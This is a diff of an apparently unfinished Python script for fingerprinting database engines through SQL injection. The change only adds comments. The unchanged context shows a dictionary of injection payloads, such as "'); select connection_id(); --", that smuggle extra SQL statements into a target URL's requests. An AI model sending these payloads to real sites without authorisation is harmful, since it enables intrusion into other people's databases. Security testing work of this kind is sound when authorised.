@@ -3,7 +3,7 @@ import requests
 from faker import Faker
 import argparse
 
-
+#argumets defined for script to work as it is designed
 parser = argparse.ArgumentParser()
 parser.add_argument("--url", help="Url to send the request.", type= str, required=True, )
 parser.add_argument("--method", help="Method for sending the request.", default="GET", type= str)
@@ -14,6 +14,7 @@ method = str.upper(args.method)
 
 
 #Payloads to find the dbms
+#Each one works only on selected dialect
 find_dbms_payloads = {
     "mysql": "'); select connection_id(); --",
     "postgresql": "'); select pg_client_encoding(); --",
@@ -43,6 +44,8 @@ if(method == "POST"):
 
 #GET request    
 elif(method == "GET"):
+    #In case of a get reques we will send 6 requests 
+    #for each payload in find_dbms_payloads
     print("ASfas")
 else:
     print("Method got incorrect value")        
